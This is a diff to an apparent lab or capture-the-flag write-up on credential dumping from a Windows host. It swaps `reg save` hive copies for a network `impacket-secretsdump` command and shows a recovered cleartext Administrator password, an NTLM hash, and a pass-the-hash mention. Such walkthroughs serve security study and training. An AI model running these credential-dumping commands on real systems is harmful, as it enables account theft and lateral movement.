@@ -304,26 +304,16 @@ Now that we are Administrator on **ERA (192.168.216.96)**, the next goal is to c
 - **SAM** — hashes of local accounts (like Administrator).
 - **LSA Secrets** — passwords of services that run as a specific account, stored in a recoverable form.
 
-We can't read these files while Windows is running (they're locked), so we saved copies of the registry hives and parsed them offline:
-
-We saved the `SAM`, `SYSTEM` and `SECURITY` hives and parsed them offline:
-
-```powershell
-reg save HKLM\SAM C:\Users\apache.ERA\Documents\sam.hiv
-reg save HKLM\SYSTEM C:\Users\apache.ERA\Documents\system.hiv
-reg save HKLM\SECURITY C:\Users\apache.ERA\Documents\security.hiv
-```
+We used `impacket-secretsdump` to dump both over the network. One command pulls the SAM hashes and the LSA secrets together:
 
 ```bash
-impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
+impacket-secretsdump 'ERA/Administrator:Almost4There8.?@192.168.216.96'
 ```
-
-`SYSTEM` holds the boot key that decrypts the other two hives — that is why we saved all three together.
 
 Two useful things came out:
 
-- **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret (MySQL runs as Administrator, so its password is stored in a readable form).
-- **The Administrator NTLM hash** — `faf613cedb73980bbd34e0a5514df813`.
+- **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret (MySQL runs as Administrator, so Windows stores that account's password in a recoverable form).
+- **The Administrator NTLM hash** — `faf613cedb73980bbd34e0a5514df813` — used later for pass-the-hash.
 
 ```
 [*] _SC_MySQL
